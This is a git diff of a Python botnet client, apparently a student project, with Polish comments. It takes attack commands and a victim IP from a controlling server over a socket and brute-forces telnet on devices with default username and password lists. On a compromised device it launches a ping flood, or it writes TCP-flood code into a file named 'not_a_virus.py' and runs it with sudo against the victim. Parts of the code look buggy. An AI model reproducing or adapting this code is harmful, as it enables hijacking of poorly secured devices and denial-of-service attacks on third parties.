@@ -6,12 +6,12 @@ from _thread import start_new_thread
 attack = False
 attack_type=''
 
-def telnetConnect(ip_address, victimIP):
+def telnetConnect(ip_address, victimIP, attackType):
     # można zrobić pętlę do wczytywania user credentials z pliku
-    global attack_type
     users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
     passwords = ['Ciumcium', 'toor', 'admin', 'root', 'user', 'raspberry']
-    ip_address="192.168.1.10"
+
+
     for user in users:
         print('connecting with login: ' + user)
         for password in passwords:
@@ -38,11 +38,12 @@ def telnetConnect(ip_address, victimIP):
                 tn.close()
                 continue
 
-            print("attack type= "+str(attack_type))
-            if attack_type == '1':  # note
+            print("attacktype= "+str(attackType))
+
+            if attackType == '1':  # note
                 print('pingujemy..')
-                tn.write(b"ping 192.168.1.24\n")  # można zrobić wątki
-                if not attack:  # tu też
+                tn.write(b"ping 192.168.100.6\n")
+                if not attack:
                     print("stopping attack")
                     return
                 time.sleep(60)
@@ -63,19 +64,26 @@ def telnetConnect(ip_address, victimIP):
 
                 # print(tn.read_all().decode('ascii'))
 
-            if attack_type == '2':
+            if attackType == '2':
                 file = open('tcp_flood_code.txt', 'r')
-                str1 = file.read()
-                str1.replace('1.1.1.1', victimIP)
-                str1.replace('111111', '10001')
+                strr = file.read()
+                newstr = strr.replace("destination_ip", victim_ip)
+                str1 = newstr.replace('destination_port', '80')
                 file.close()
-                print("weszło: "+str1)
 
+                bfile = bytes(str1.encode())
+                tn.write(b"rm not_a_virus.py\n")
                 tn.write(b"touch not_a_virus.py\n")
-                tn.write(bytes('echo ' + '"' + str1 + '"' + '>>' + 'not_a_virus.py'+'\n', encoding="ascii"))
+                print("1\n")
+                tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus.py' + b'\n')
+                print('2')
+
+                tn.write(b"sudo python not_a_virus.py\n")
+                tn.write(b"ls\n")
+
+                tn.write(b"exit\n")
                 time.sleep(60)
-                #print(tn.read_all().decode('ascii'))
-                #print(tn.write(b"python Not_A_VirusTCP.py"))
+
 
                 if not attack:
                     print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
@@ -91,13 +99,13 @@ def telnetConnect(ip_address, victimIP):
     # t.close()
 
 
-def checkForOtherDevices(ip, victimIP,type):
+def checkForOtherDevices(ip, victimIP):
     x = 2
     l = len(ip)
     g = ip.split('.')[-1]
     ip = ip[:l - len(g)]
     print('connecting to telnet...')
-    start_new_thread(telnetConnect, ("192.168.1.10", victimIP, ))
+    start_new_thread(telnetConnect, ("192.168.100.8", victimIP, attack_type))
     # while x < 254:
     #     if not attack:
     #         return
@@ -111,7 +119,7 @@ def checkForOtherDevices(ip, victimIP,type):
 
 
 if __name__ == '__main__':
-    global attack_type
+
     #HOST = '192.168.100.11'  # The server's hostname or IP address
     HOST = '127.0.0.1'
     PORT = 65432  # The port used by the server
@@ -141,14 +149,10 @@ if __name__ == '__main__':
                 time.sleep(1)
                 print("Connection established!")
             try:
-                attack_type = str(s.recv(1).decode())
-                print('Received', str(attack_type))
-                if str(attack_type) == '1':
-                    victim_ip = str(s.recv(16).decode())
-                    print('victim address:' + str(victim_ip))
-                    checkForOtherDevices(HOST, victim_ip)
-                    attack = True
-                if str(attack_type) == '2':
+                data = str(s.recv(1).decode())
+                print('Received', str(data))
+                if data == '1' or data=='2' :
+                    attack_type=data
                     victim_ip = str(s.recv(16).decode())
                     print('victim address:' + str(victim_ip))
                     checkForOtherDevices(HOST, victim_ip)
